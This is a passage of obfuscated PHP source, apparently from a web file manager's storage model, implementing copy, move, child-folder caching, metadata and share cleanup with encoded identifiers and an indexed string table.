(!isset(self::$_lockItemArr[$±·Ã¸ÑĞ])) { return; } unset(self::$_lockItemArr[$±·Ã¸ÑĞ]); CacheLock::unlock($±·Ã¸ÑĞ); } } public function isParentOf($ê¼Õ‘ŞÆ, $ÌÔ¬ºòï) { $§Ì¯ˆØ€ =& $_SERVER[Ò°Ì”İ•]; $àâˆ­ñ¨ = $this->sourceInfo($ê¼Õ‘ŞÆ); $ñºİ¹á = $this->sourceInfo($ÌÔ¬ºòï); $½ë®¾Â = $àâˆ­ñ¨[$§Ì¯ˆØ€[596]] . $àâˆ­ñ¨[$§Ì¯ˆØ€[204]] . $§Ì¯ˆØ€[50]; $èééó²ó = $ñºİ¹á[$§Ì¯ˆØ€[596]] . $ñºİ¹á[$§Ì¯ˆØ€[204]] . $§Ì¯ˆØ€[50]; $ŒÁåûº› = strpos($èééó²ó, $½ë®¾Â) === 0; return $ŒÁåûº›; } private $targetIsDelete = 0; public function copy($¬é‚è÷³, $‘ä„§¶, $Í€é½Œî = REPEAT_REPLACE, $ìè¦¬Ü€ = '') { $íìÚÜüË =& $_SERVER[Ò°Ì”İ•]; $‘â®§ª¦ = $this->sourceInfo($¬é‚è÷³); $Ş¤õ”’ü = $this->sourceInfo($‘ä„§¶); if (!$‘â®§ª¦ || !$Ş¤õ”’ü || $Ş¤õ”’ü[$íìÚÜüË[497]] != $íìÚÜüË[102]) { return !1; } if ($this->isParentOf($¬é‚è÷³, $‘ä„§¶)) { return !1; } $ı²Ü•ı‰ = $ìè¦¬Ü€ ? $ìè¦¬Ü€ : $‘â®§ª¦[$íìÚÜüË[32]]; $this->lockCopyStart($¬é‚è÷³); $this->lockWriteStart($‘ä„§¶, $ı²Ü•ı‰); $àê§÷¥ = array($íìÚÜüË[644] => array(), $íìÚÜüË[645] => array(), $íìÚÜüË[646] => array()); $this->targetIsDelete = intval($‘â®§ª¦[$íìÚÜüË[517]]); $¹ğÑ¸ = $this->fileNameExistAuto($‘ä„§¶, $‘â®§ª¦); $èøøŠ¹¥ = $this->_copy($¬é‚è÷³, $‘ä„§¶, $Í€é½Œî, $àê§÷¥, !0, $ìè¦¬Ü€); $this->_childrenListClear(); $this->lockCopyEnd($¬é‚è÷³); $this->lockWriteEnd($‘ä„§¶, $ı²Ü•ı‰); if ($‘â®§ª¦[$íìÚÜüË[497]] == $íìÚÜüË[102] && $¹ğÑ¸ == $èøøŠ¹¥) { $this->folderSizeResetChildren($¹ğÑ¸); } Model($íìÚÜüË[647])->addAll($àê§÷¥[$íìÚÜüË[645]], array(), !0); if ($¹ğÑ¸ != $èøøŠ¹¥ || $‘â®§ª¦[$íìÚÜüË[497]] == $íìÚÜüË[102]) { Model($íìÚÜüË[648])->eventCopy($èøøŠ¹¥); } $this->saveAll($àê§÷¥[$íìÚÜüË[646]]); Model($íìÚÜüË[243])->linkAdd($àê§÷¥[$íìÚÜüË[644]]); $this->folderSizeReset($‘ä„§¶); $this->updateModifyTime($‘ä„§¶); return $èøøŠ¹¥; } private function _copy($ˆÆÕÈÙ½, $¤³ŸÒøÄ, $Š·†³…±, &$©®—óÓÄ, $»äÁîßü, $¿©ìãÃè = '') { $»éŠ»í =& $_SERVER[Ò°Ì”İ•]; $ïö†¢„Í = $this->sourceInfoCache($ˆÆÕÈÙ½); $Ü‘±Ş€À = $ïö†¢„Í[$»éŠ»í[497]] == $»éŠ»í[102]; $ÈÁÑ —Î = $¿©ìãÃè ? $¿©ìãÃè : $ïö†¢„Í[$»éŠ»í[32]]; $¯ûâ‚öµ = $this->fileNameExistAuto($¤³ŸÒøÄ, $ïö†¢„Í); if ($»äÁîßü) { $this->_childrenAllMake($ˆÆÕÈÙ½); if ($Ü‘±Ş€À && $¯ûâ‚öµ) { $this->_childrenAllMake($¯ûâ‚öµ); } } if (!$¯ûâ‚öµ) { return $this->_copyCreate($ˆÆÕÈÙ½, $¤³ŸÒøÄ, $ÈÁÑ —Î, $©®—óÓÄ); } $óƒà÷Ö = $¯ûâ‚öµ; if ($Ü‘±Ş€À) { if ($Š·†³…± == REPEAT_RENAME_FOLDER) { $ÈÁÑ —Î = $this->fileNameAutoCache($¤³ŸÒøÄ, $ÈÁÑ —Î, $Š·†³…±, $Ü‘±Ş€À); $óƒà÷Ö = $this->_copyCreate($ˆÆÕÈÙ½, $¤³ŸÒøÄ, $ÈÁÑ —Î, $©®—óÓÄ); } else { $Û¿‹Ó = $this->_childrenList($ˆÆÕÈÙ½); foreach ($Û¿‹Ó as $ŸÂÖ¡¢õ) { $this->_copy($ŸÂÖ¡¢õ[$»éŠ»í[204]], $¯ûâ‚öµ, $Š·†³…±, $©®—óÓÄ, !1); } } } else { if ($Š·†³…± == REPEAT_RENAME || $Š·†³…± == REPEAT_RENAME_FOLDER) { $ÈÁÑ —Î = $this->fileNameAutoCache($¤³ŸÒøÄ, $ÈÁÑ —Î, $Š·†³…±, $Ü‘±Ş€À); $óƒà÷Ö = $this->_copyCreate($ˆÆÕÈÙ½, $¤³ŸÒøÄ, $ÈÁÑ —Î, $©®—óÓÄ); } else { if ($Š·†³…± == REPEAT_REPLACE) { $ŒÄõô   = $this->sourceInfoCache($¯ûâ‚öµ); $àùóŒ¢Ú = $this->fileHistory($ŒÄõô  , $ïö†¢„Í[$»éŠ»í[553]], $ïö†¢„Í[$»éŠ»í[90]]); if ($àùóŒ¢Ú) { $©®—óÓÄ[$»éŠ»í[644]][] = $ïö†¢„Í[$»éŠ»í[553]]; } } else { if ($Š·†³…± == REPEAT_SKIP) { } } } Hook::trigger($»éŠ»í[649], array($»éŠ»í[650], $ïö†¢„Í, 0)); } return $óƒà÷Ö; } private function _copyCreate($ã’¡ ›ó, $æ ıŞ™›, $½•×¡æ, &$ÒÒË¹ï) { $Ÿ×ÂÀŠ =& $_SERVER[Ò°Ì”İ•]; $ªØß´ûø = $this->sourceInfoCache($ã’¡ ›ó); $·ıò¼ªŞ = $this->sourceInfoCache($æ ıŞ™›); $¶¦­ì‡ø = $this->_makeItemData($ªØß´ûø, $·ıò¼ªŞ, $½•×¡æ); Hook::trigger($Ÿ×ÂÀŠ[651], $¶¦­ì‡ø); Hook::trigger($Ÿ×ÂÀŠ[652], array($Ÿ×ÂÀŠ[653], $¶¦­ì‡ø, 0)); $‘ë»›øÆ = $this->add($¶¦­ì‡ø); $×—òÖ› = array($Ÿ×ÂÀŠ[204] => $‘ë»›øÆ, $Ÿ×ÂÀŠ[32] => $½•×¡æ); $this->_copyApplyMeta($×—òÖ›, $ÒÒË¹ï); if ($ªØß´ûø[$Ÿ×ÂÀŠ[497]] != $Ÿ×ÂÀŠ[102]) { $ÒÒË¹ï[$Ÿ×ÂÀŠ[644]][] = $ªØß´ûø[$Ÿ×ÂÀŠ[553]]; return $‘ë»›øÆ; } $Ê¢ü„€ = array(); $»ØàÁŠË = array(); $this->_childrenListAll($ã’¡ ›ó, $Ê¢ü„€); $êòà©ÄÒ = count($Ê¢ü„€); if ($êòà©ÄÒ == 0) { return $‘ë»›øÆ; } $Õğ¾â¼ = $this->sourceInfo($‘ë»›øÆ); foreach ($Ê¢ü„€ as $õã«İÏ«) { $ÆÒõ€Şœ = $this->_makeItemData($õã«İÏ«, $Õğ¾â¼, $õã«İÏ«[$Ÿ×ÂÀŠ[32]]); $ÆÒõ€Şœ[$Ÿ×ÂÀŠ[596]] = $õã«İÏ«[$Ÿ×ÂÀŠ[596]]; $»ØàÁŠË[] = $ÆÒõ€Şœ; } $this->chunkEventSet($Ÿ×ÂÀŠ[654], array($Ÿ×ÂÀŠ[655], $¶¦­ì‡ø, $êòà©ÄÒ)); $this->addAll($»ØàÁŠË, array(), !1); $ÏÚº×ê = $this->where(array($Ÿ×ÂÀŠ[203] => $‘ë»›øÆ))->select(); $è§àëŸö = $this->_childrenMakeRelation($Ê¢ü„€, $ÏÚº×ê); $è§àëŸö[$ã’¡ ›ó] = $‘ë»›øÆ; $µó’…÷ = array(); $º¾“•—Ã = array(); foreach ($ÏÚº×ê as $õã«İÏ«) { $ìÖ‡´ô¼ = $õã«İÏ«[$Ÿ×ÂÀŠ[204]]; $Ò¶¸Ùàø = $this->_childrenMatch($è§àëŸö, $õã«İÏ«, $Õğ¾â¼); $µó’…÷[] = array($Ÿ×ÂÀŠ[204], $ìÖ‡´ô¼, $Ÿ×ÂÀŠ[203], $Ò¶¸Ùàø[$Ÿ×ÂÀŠ[203]]); $º¾“•—Ã[] = array($Ÿ×ÂÀŠ[204], $ìÖ‡´ô¼, $Ÿ×ÂÀŠ[596], $Ò¶¸Ùàø[$Ÿ×ÂÀŠ[596]]); $this->_copyApplyMeta($õã«İÏ«, $ÒÒË¹ï); if ($õã«İÏ«[$Ÿ×ÂÀŠ[497]] != $Ÿ×ÂÀŠ[102]) { $ÒÒË¹ï[$Ÿ×ÂÀŠ[644]][] = $õã«İÏ«[$Ÿ×ÂÀŠ[553]]; } } $this->chunkEventSet($Ÿ×ÂÀŠ[656], array($Ÿ×ÂÀŠ[657], $¶¦­ì‡ø, $êòà©ÄÒ)); $this->saveAll($µó’…÷); $this->chunkEventSet($Ÿ×ÂÀŠ[658], array($Ÿ×ÂÀŠ[659], $¶¦­ì‡ø, $êòà©ÄÒ)); $this->saveAll($º¾“•—Ã); return $‘ë»›øÆ; } private function _childrenMakeRelation($àèÁ‰», $ú–¸‚×Õ) { $»ÃäŞµë =& $_SERVER[Ò°Ì”İ•]; $Ø’ñ¾øÁ = array(); $ŸÂÇ–¿Ş = array(); foreach ($àèÁ‰» as $°ø¤Ø—õ) { $¾ñå•† = $°ø¤Ø—õ[$»ÃäŞµë[32]] . $»ÃäŞµë[8] . $°ø¤Ø—õ[$»ÃäŞµë[596]]; $Ø’ñ¾øÁ[$¾ñå•†] = $°ø¤Ø—õ[$»ÃäŞµë[204]]; } foreach ($ú–¸‚×Õ as $°ø¤Ø—õ) { $¾ñå•† = $°ø¤Ø—õ[$»ÃäŞµë[32]] . $»ÃäŞµë[8] . $°ø¤Ø—õ[$»ÃäŞµë[596]]; $Á›çâ¬ = $Ø’ñ¾øÁ[$¾ñå•†]; $ŸÂÇ–¿Ş[$Á›çâ¬] = $°ø¤Ø—õ[$»ÃäŞµë[204]]; } return $ŸÂÇ–¿Ş; } private function _childrenMatch($áÅ³úû‹, $çÓøæş, $“Õà†Ù) { $Ú¥±È =& $_SERVER[Ò°Ì”İ•]; $ÂîèŠƒ = $“Õà†Ù[$Ú¥±È[596]]; $³ìë‰ƒæ = $this->parentLevelArray($çÓøæş[$Ú¥±È[596]]); foreach ($³ìë‰ƒæ as $Ù˜³¦) { if (isset($áÅ³úû‹[$Ù˜³¦])) { $ÂîèŠƒ .= $áÅ³úû‹[$Ù˜³¦] . $Ú¥±È[660]; } } $ÂîèŠƒ = rtrim($ÂîèŠƒ, $Ú¥±È[50]) . $Ú¥±È[50]; $ß‘ïåÈ = $this->parentLevelArray($ÂîèŠƒ); $âŞÆÇù† = $ß‘ïåÈ[count($ß‘ïåÈ) - 1]; return array($Ú¥±È[203] => $âŞÆÇù†, $Ú¥±È[596] => $ÂîèŠƒ); } private function _makeItemData($õ«ºıÉƒ, $ôŠ¾¶Ë, $Û”Õı–å) { $Üåìàéš =& $_SERVER[Ò°Ì”İ•]; $Ü³Î— ¡ = array($Üåìàéš[661] => $õ«ºıÉƒ[$Üåìàéš[497]], $Üåìàéš[506] => $Û”Õı–å, $Üåìàéš[662] => $õ«ºıÉƒ[$Üåìàéš[498]] ? $õ«ºıÉƒ[$Üåìàéš[498]] : $Üåìàéš[12], $Üåìàéš[554] => $õ«ºıÉƒ[$Üåìàéš[553]] ? $õ«ºıÉƒ[$Üåìàéš[553]] : 0, $Üåìàéš[632] => $õ«ºıÉƒ[$Üåìàéš[90]] ? $õ«ºıÉƒ[$Üåìàéš[90]] : 0, $Üåìàéš[663] => intval($ôŠ¾¶Ë[$Üåìàéš[201]]), $Üåìàéš[664] => intval($ôŠ¾¶Ë[$Üåìàéš[581]]), $Üåìàéš[665] => intval(USER_ID), $Üåìàéš[666] => intval(USER_ID), $Üåìàéš[489] => intval($ôŠ¾¶Ë[$Üåìàéš[204]]), $Üåìàéš[667] => $ôŠ¾¶Ë[$Üåìàéš[596]] . $ôŠ¾¶Ë[$Üåìàéš[204]] . $Üåìàéš[50], $Üåìàéš[510] => $õ«ºıÉƒ[$Üåìàéš[99]] ? $õ«ºıÉƒ[$Üåìàéš[99]] : time(), $Üåìàéš[516] => 0, $Üåìàéš[668] => $Üåìàéš[12]); return $Ü³Î— ¡; } private function _copyApplyMeta($íÃ®‹Š, &$í¾ŠôÑ€) { $Æõ¬¸‘ =& $_SERVER[Ò°Ì”İ•]; $Âñ…‰ã = $íÃ®‹Š[$Æõ¬¸‘[204]]; $†ò•»©» = $íÃ®‹Š[$Æõ¬¸‘[32]]; if (!isset($íÃ®‹Š[$Æõ¬¸‘[669]]) || !$íÃ®‹Š[$Æõ¬¸‘[669]] || $íÃ®‹Š[$Æõ¬¸‘[669]] == $Æõ¬¸‘[241]) { $í¾ŠôÑ€[$Æõ¬¸‘[646]][] = array($Æõ¬¸‘[204], $Âñ…‰ã, $Æõ¬¸‘[669], short_id($Âñ…‰ã)); } if (Input::check($†ò•»©», $Æõ¬¸‘[670])) { $í¾ŠôÑ€[$Æõ¬¸‘[645]][] = array($Æõ¬¸‘[204] => $Âñ…‰ã, $Æõ¬¸‘[108] => $Æõ¬¸‘[550], $Æõ¬¸‘[462] => str_replace($Æõ¬¸‘[53], $Æõ¬¸‘[12], Pinyin::get($†ò•»©»))); $í¾ŠôÑ€[$Æõ¬¸‘[645]][] = array($Æõ¬¸‘[204] => $Âñ…‰ã, $Æõ¬¸‘[108] => $Æõ¬¸‘[549], $Æõ¬¸‘[462] => Pinyin::get($†ò•»©», $Æõ¬¸‘[671])); } $í¾ŠôÑ€[$Æõ¬¸‘[645]][] = array($Æõ¬¸‘[204] => $Âñ…‰ã, $Æõ¬¸‘[108] => $Æõ¬¸‘[529], $Æõ¬¸‘[462] => KodSort::makeStr($†ò•»©»)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($‡õ¡¶É¨) { $Ó÷¦ğ±ú =& $_SERVER[Ò°Ì”İ•]; $¨–ÛÚ¸è = $this->sourceInfo($‡õ¡¶É¨); $‰Şíîˆ­ = $Ó÷¦ğ±ú[672]; $°Éç¸Ó¼ = array($Ó÷¦ğ±ú[596] => array($Ó÷¦ğ±ú[627], $¨–ÛÚ¸è[$Ó÷¦ğ±ú[596]] . $‡õ¡¶É¨ . $Ó÷¦ğ±ú[628]), $Ó÷¦ğ±ú[517] => $this->targetIsDelete); $Ÿã¦„£È = $this->field($‰Şíîˆ­)->where($°Éç¸Ó¼)->select(); if (!$Ÿã¦„£È) { return; } $Ÿã¦„£È = array_to_keyvalue($Ÿã¦„£È, $Ó÷¦ğ±ú[204]); foreach ($Ÿã¦„£È as $‚Éä¸ì) { $‰±°øñ— = $‚Éä¸ì[$Ó÷¦ğ±ú[203]]; $‡õ¡¶É¨ = $‚Éä¸ì[$Ó÷¦ğ±ú[204]]; if (!isset($this->_childrenListCache[$‡õ¡¶É¨]) && $‚Éä¸ì[$Ó÷¦ğ±ú[497]] == $Ó÷¦ğ±ú[102]) { $this->_childrenListCache[$‡õ¡¶É¨] = array(); } if (!isset($this->_childrenListCache[$‰±°øñ—])) { $this->_childrenListCache[$‰±°øñ—] = array(); } $this->_childrenListCache[$‰±°øñ—][$‡õ¡¶É¨] = $‚Éä¸ì; $this->_childrenItemCache[$‡õ¡¶É¨] = $‚Éä¸ì; } } private function _childrenListAll($øƒÛ³‚Ë, &$û†Ãø¯Œ) { $³ê¢şÎ¢ =& $_SERVER[Ò°Ì”İ•]; if (!isset($this->_childrenListCache[$øƒÛ³‚Ë])) { return; } $ÜĞåÏó = $this->_childrenListCache[$øƒÛ³‚Ë]; foreach ($ÜĞåÏó as $³¤±Û½§ => $åÄŒœç©) { $û†Ãø¯Œ[$³¤±Û½§] = $åÄŒœç©; if ($åÄŒœç©[$³ê¢şÎ¢[497]] == $³ê¢şÎ¢[102]) { $this->_childrenListAll($³¤±Û½§, $û†Ãø¯Œ); } } } private function sourceInfoCache($áØß²Õ) { if (isset($this->_childrenItemCache[$áØß²Õ])) { return $this->_childrenItemCache[$áØß²Õ]; } return $this->sourceInfo($áØß²Õ); } private function _childrenList($Õ–ö³˜Ş) { if (isset($this->_childrenListCache[$Õ–ö³˜Ş])) { return $this->_childrenListCache[$Õ–ö³˜Ş]; } return $this->_childrenListSelect($Õ–ö³˜Ş); } private function _childrenListSelect($ñ·Ÿ¨ö¹) { $ïÈ€¡• =& $_SERVER[Ò°Ì”İ•]; $¼‘ÜÂÂ  = array($ïÈ€¡•[203] => $ñ·Ÿ¨ö¹, $ïÈ€¡•[517] => $this->targetIsDelete); $—ëáÔ€” = $this->where($¼‘ÜÂÂ )->select(); $—ëáÔ€” = $—ëáÔ€” ? $—ëáÔ€” : array(); $ˆ€€¡Œû = array_to_keyvalue($—ëáÔ€”, $ïÈ€¡•[204]); $this->_childrenListCache[$ñ·Ÿ¨ö¹] = $ˆ€€¡Œû; foreach ($ˆ€€¡Œû as $ñ·Ÿ¨ö¹ => $Ç“ß‘İ€) { $this->_childrenItemCache[$ñ·Ÿ¨ö¹] = $Ç“ß‘İ€; } return $ˆ€€¡Œû; } private function fileNameExistAuto($®¥øê½Ø, $ú‡Şú§›) { $¡ì³øåª =& $_SERVER[Ò°Ì”İ•]; if ($ú‡Şú§›[$¡ì³øåª[517]] == $¡ì³øåª[102]) { return $this->fileNameExist($®¥øê½Ø, $ú‡Şú§›[$¡ì³øåª[32]]); } return $this->fileNameExistCache($®¥øê½Ø, $ú‡Şú§›[$¡ì³øåª[32]]); } private function fileNameExistCache($¾ë–£”, $¯°ÕóºÏ) { $¬ß‚§›ë =& $_SERVER[Ò°Ì”İ•]; $¯°ÕóºÏ = strtolower($¯°ÕóºÏ); $¼ÆÚ‡´û = $this->_childrenList($¾ë–£”); foreach ($¼ÆÚ‡´û as $”º”²Èİ) { if ($¯°ÕóºÏ == strtolower($”º”²Èİ[$¬ß‚§›ë[32]])) { return $”º”²Èİ[$¬ß‚§›ë[204]]; } } return !1; } private function fileNameAutoCache($úşáÈøÙ, $¤šé£Ü·, $È‰Á å, $Ñ¨úşĞŸ) { $‹Ó“á¥ =& $_SERVER[Ò°Ì”İ•]; $ƒµĞÈ¸ = $this->_childrenList($úşáÈøÙ); $§“ËÒò´ = array_to_keyvalue($ƒµĞÈ¸, $‹Ó“á¥[12], $‹Ó“á¥[32]); return $this->fileNameAutoGet($§“ËÒò´, $¤šé£Ü·, $È‰Á å, $Ñ¨úşĞŸ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($¾œ˜§å‚, $‡û±Î“, $Š‡¶Æ«– = REPEAT_REPLACE, $”¶ëØİ¥ = '') { $» Éæ Ì =& $_SERVER[Ò°Ì”İ•]; $ç‹è‹´¤ = $this->sourceInfo($¾œ˜§å‚); $Ô‰‡·Ò“ = $this->sourceInfo($‡û±Î“); if ($ç‹è‹´¤[$» Éæ Ì[203]] == $Ô‰‡·Ò“[$» Éæ Ì[204]]) { if ($ç‹è‹´¤[$» Éæ Ì[517]] == $» Éæ Ì[102]) { Model($» Éæ Ì[515])->restore(array($¾œ˜§å‚)); } if (!$”¶ëØİ¥ || $”¶ëØİ¥ == $ç‹è‹´¤[$» Éæ Ì[32]]) { return $¾œ˜§å‚; } } $äæÇàÖŸ = $this->pathInfoMore($¾œ˜§å‚); if ($this->isParentOf($¾œ˜§å‚, $‡û±Î“)) { return !1; } if (!$ç‹è‹´¤ || !$Ô‰‡·Ò“ || $Ô‰‡·Ò“[$» Éæ Ì[497]] != $» Éæ Ì[102]) { return !1; } Hook::trigger($» Éæ Ì[673], $äæÇàÖŸ); $this->targetIsDelete = intval($ç‹è‹´¤[$» Éæ Ì[517]]); if ($ç‹è‹´¤[$» Éæ Ì[203]] == $‡û±Î“ && $”¶ëØİ¥ != $ç‹è‹´¤[$» Éæ Ì[32]]) { $üîêÓî÷ = $this->fileNameExist($‡û±Î“, $”¶ëØİ¥); if ($üîêÓî÷ && $ç‹è‹´¤[$» Éæ Ì[497]] == $» Éæ Ì[241]) { $áöòì‘ = $this->sourceInfo($üîêÓî÷); $Ñ×Û³›³ = $this->fileHistory($áöòì‘, $ç‹è‹´¤[$» Éæ Ì[553]], $ç‹è‹´¤[$» Éæ Ì[90]]); if (!$Ñ×Û³›³) { Model($» Éæ Ì[556])->remove($ç‹è‹´¤[$» Éæ Ì[553]]); } $this->removeNow($¾œ˜§å‚, !1); $this->folderSizeReset($‡û±Î“); Hook::trigger($» Éæ Ì[674], $äæÇàÖŸ); return $üîêÓî÷; } } $½É¾òˆÙ = $”¶ëØİ¥ ? $”¶ëØİ¥ : $ç‹è‹´¤[$» Éæ Ì[32]]; $this->lockMoveStart($¾œ˜§å‚); $this->lockWriteStart($‡û±Î“, $½É¾òˆÙ); $­à«®ËÅ = array($» Éæ Ì[644] => array(), $» Éæ Ì[675] => !1); $this->clearShare($¾œ˜§å‚, $‡û±Î“); $ø„±ã¸Â = $this->fileNameExistAuto($‡û±Î“, $ç‹è‹´¤); $³í­–¼Ğ = $this->_move($¾œ˜§å‚, $‡û±Î“, $Š‡¶Æ«–, $­à«®ËÅ, $”¶ëØİ¥); $this->sourceCacheClear(); if ($ç‹è‹´¤[$» Éæ Ì[497]] == $» Éæ Ì[102] && $ø„±ã¸Â) { $this->folderSizeResetChildren($³í­–¼Ğ); } Model($» Éæ Ì[243])->linkAdd($­à«®ËÅ[$» Éæ Ì[644]]); if ($³í­–¼Ğ && $ø„±ã¸Â && $­à«®ËÅ[$» Éæ Ì[675]]) { $ø­æ‰Å» = $ç‹è‹´¤[$» Éæ Ì[497]] == $» Éæ Ì[102] ? $this->_childrenListSelect($¾œ˜§å‚) : !1; $â¾–‡ü = $ø­æ‰Å» && count($ø­æ‰Å») > 0 ? !0 : !1; $this->removeNow($¾œ˜§å‚, $â¾–‡ü); } $this->lockMoveEnd($¾œ˜§å‚); $this->lockWriteEnd($‡û±Î“, $½É¾òˆÙ); $this->folderSizeReset($ç‹è‹´¤[$» Éæ Ì[203]]); $this->folderSizeReset($‡û±Î“); $ªäşı¶Î = array($ç‹è‹´¤[$» Éæ Ì[203]], $‡û±Î“); if ($ç‹è‹´¤[$» Éæ Ì[497]] == $» Éæ Ì[102]) { $ªäşı¶Î[] = $¾œ˜§å‚; } $this->updateModifyTime($ªäşı¶Î); Model($» Éæ Ì[648])->eventMove($¾œ˜§å‚, $ç‹è‹´¤[$» Éæ Ì[203]], $‡û±Î“); Hook::trigger($» Éæ Ì[674], $äæÇàÖŸ); return $³í­–¼Ğ; } private function _move($½´“¯òø, $û³ºµ¥, $š†á¬É», &$ëÏİ„™, $™Ï±§²Ç = '') { $³Ø³­¬„ =& $_SERVER[Ò°Ì”İ•]; $³¯€úß = $this->sourceInfo($½´“¯òø); $ƒÉ²Ê²Á = $³¯€úß[$³Ø³­¬„[497]] == $³Ø³­¬„[102]; $¹›™ÛÅ = $™Ï±§²Ç ? $™Ï±§²Ç : $³¯€úß[$³Ø³­¬„[32]]; $İíó†šÔ = $this->fileNameExistAuto($û³ºµ¥, $³¯€úß); $this->lockMoveStart($½´“¯òø); $this->lockWriteStart($û³ºµ¥, $¹›™ÛÅ); if (!$İíó†šÔ) { return $this->_moveForce($½´“¯òø, $û³ºµ¥, $¹›™ÛÅ); } $¡íî‘·ğ = $İíó†šÔ; $ê’ÎßØÜ = !1; if ($ƒÉ²Ê²Á) { if ($š†á¬É» == REPEAT_RENAME_FOLDER) { $¹›™ÛÅ = $this->fileNameAuto($û³ºµ¥, $¹›™ÛÅ, $š†á¬É», $ƒÉ²Ê²Á); $¡íî‘·ğ = $this->_moveForce($½´“¯òø, $û³ºµ¥, $¹›™ÛÅ); } else { $©¸†¬‰­ = $this->_childrenListSelect($½´“¯òø); foreach ($©¸†¬‰­ as $Íñ¬À”‚) { $¦Œµ¬Ÿø = REPEAT_REPLACE; $this->_move($Íñ¬À”‚[$³Ø³­¬„[204]], $İíó†šÔ, $¦Œµ¬Ÿø, $ëÏİ„™); } $ê’ÎßØÜ = !0; } } else { if ($š†á¬É» == REPEAT_RENAME || $š†á¬É» == REPEAT_RENAME_FOLDER) { $¹›™ÛÅ = $this->fileNameAuto($û³ºµ¥, $¹›™ÛÅ, $š†á¬É», $ƒÉ²Ê²Á); $¡íî‘·ğ = $this->_moveForce($½´“¯òø, $û³ºµ¥, $¹›™ÛÅ); } else { $ø“ó·’Ş = $this->sourceInfoCache($İíó†šÔ); $Æ™ô“Á¡ = $this->fileHistory($ø“ó·’Ş, $³¯€úß[$³Ø³­¬„[553]], $³¯€úß[$³Ø³­¬„[90]]); if ($Æ™ô“Á¡) { $ëÏİ„™[$³Ø³­¬„[644]][] = $³¯€úß[$³Ø³­¬„[553]]; } $ê’ÎßØÜ = !0; } } if ($ê’ÎßØÜ) { $ëÏİ„™[$³Ø³­¬„[675]] = !0; } return $¡íî‘·ğ; } private function _moveForce($›â‘½şË, $ä¤–¯Œæ, $¯ïÒªáã) { $£•ØúÊÓ =& $_SERVER[Ò°Ì”İ•]; $ŸŞ¼¨š = $this->sourceInfo($›â‘½şË); $ò§Ş¾“è = $this->sourceInfo($ä¤–¯Œæ); $ó‡Ÿ¦ªã = $ŸŞ¼¨š[$£•ØúÊÓ[497]] == $£•ØúÊÓ[102]; $¥­·²ø« = array($£•ØúÊÓ[489] => $ò§Ş¾“è[$£•ØúÊÓ[204]], $£•ØúÊÓ[667] => $ò§Ş¾“è[$£•ØúÊÓ[596]] . $ò§Ş¾“è[$£•ØúÊÓ[204]] . $£•ØúÊÓ[50], $£•ØúÊÓ[663] => $ò§Ş¾“è[$£•ØúÊÓ[201]], $£•ØúÊÓ[664] => $ò§Ş¾“è[$£•ØúÊÓ[581]], $£•ØúÊÓ[666] => USER_ID, $£•ØúÊÓ[506] => $¯ïÒªáã); $×˜ä…˜Ò = $ŸŞ¼¨š[$£•ØúÊÓ[201]] == SourceModel::TYPE_GROUP && $ò§Ş¾“è[$£•ØúÊÓ[201]] == SourceModel::TYPE_GROUP && $ŸŞ¼¨š[$£•ØúÊÓ[581]] == $ò§Ş¾“è[$£•ØúÊÓ[581]]; if (!$×˜ä…˜Ò && $this->moveClearAuth) { Model($£•ØúÊÓ[579])->authClear($›â‘½şË); } $Ìˆ —û¸ = $ŸŞ¼¨š[$£•ØúÊÓ[517]] == $£•ØúÊÓ[102] && $ò§Ş¾“è[$£•ØúÊÓ[517]] != $£•ØúÊÓ[102]; if ($Ìˆ —û¸) { $¥­·²ø«[$£•ØúÊÓ[516]] = 0; } if ($ó‡Ÿ¦ªã) { $ƒÓ÷Øº = array($£•ØúÊÓ[667] => array($£•ØúÊÓ[627], $ŸŞ¼¨š[$£•ØúÊÓ[596]] . $ŸŞ¼¨š[$£•ØúÊÓ[204]] . $£•ØúÊÓ[628])); $êÀØğÂ = $ŸŞ¼¨š[$£•ØúÊÓ[596]] . $ŸŞ¼¨š[$£•ØúÊÓ[204]] . $£•ØúÊÓ[50]; $ø´ıìï° = $ò§Ş¾“è[$£•ØúÊÓ[596]] . $ò§Ş¾“è[$£•ØúÊÓ[204]] . $£•ØúÊÓ[50] . $ŸŞ¼¨š[$£•ØúÊÓ[204]] . $£•ØúÊÓ[50]; $üË¿¦€§ = array($£•ØúÊÓ[667] => array($£•ØúÊÓ[676], "\x72\145\160\154\141\x63\x65\50\x70\x61\162\145\156\164\114\x65\x76\x65\154\54\47{$êÀØğÂ}\47\54\x27{$ø´ıìï°}\47\51"), $£•ØúÊÓ[663] => $ò§Ş¾“è[$£•ØúÊÓ[201]], $£•ØúÊÓ[664] => $ò§Ş¾“è[$£•ØúÊÓ[581]]); if ($Ìˆ —û¸) { $üË¿¦€§[$£•ØúÊÓ[516]] = 0; } $this->where($ƒÓ÷Øº)->data($üË¿¦€§)->save(); } $this->where(array($£•ØúÊÓ[503] => $›â‘½şË))->data($¥­·²ø«)->save(); return $›â‘½şË; } private function clearShare($úüğ›‘, $©¶Ğïº©) { $ãÉ‚×Æ“ =& $_SERVER[Ò°Ì”İ•]; $œœ¦‰Å® = $this->sourceInfo($úüğ›‘); $¼æ†Åïó = $this->sourceInfo($©¶Ğïº©); if ($œœ¦‰Å®[$ãÉ‚×Æ“[581]] == $¼æ†Åïó[$ãÉ‚×Æ“[581]] && $œœ¦‰Å®[$ãÉ‚×Æ“[201]] == $ãÉ‚×Æ“[677]) { return; } $à€ÓşÆ = array($ãÉ‚×Æ“[596] => array($ãÉ‚×Æ“[627], $œœ¦‰Å®[$ãÉ‚×Æ“[596]] . $úüğ›‘ . $ãÉ‚×Æ“[628])); $åŠ¾âï = $this->field($ãÉ‚×Æ“[503])->where($à€ÓşÆ)->getField($ãÉ‚×Æ“[204], !0); if (!$åŠ¾âï) { return; } $à€ÓşÆ = array($ãÉ‚×Æ“[204] => array($ãÉ‚×Æ“[7], $åŠ¾âï), $ãÉ‚×Æ“[678] => 1); $öüôü¥ü = Model($ãÉ‚×Æ“[679])->field($ãÉ‚×Æ“[680])->where($à€ÓşÆ)->select(); if (!$öüôü¥ü) { return; } $öüôü¥ü = array_to_keyvalue($öüôü¥ü, $ãÉ‚×Æ“[12], $ãÉ‚×Æ“[680]); $à€ÓşÆ = array($ãÉ‚×Æ“[680] => array($ãÉ‚×Æ“[7], $öüôü¥ü)); Model($ãÉ‚×Æ“[679])->where($à€ÓşÆ)->save(array($ãÉ‚×Æ“[678] => 0)); 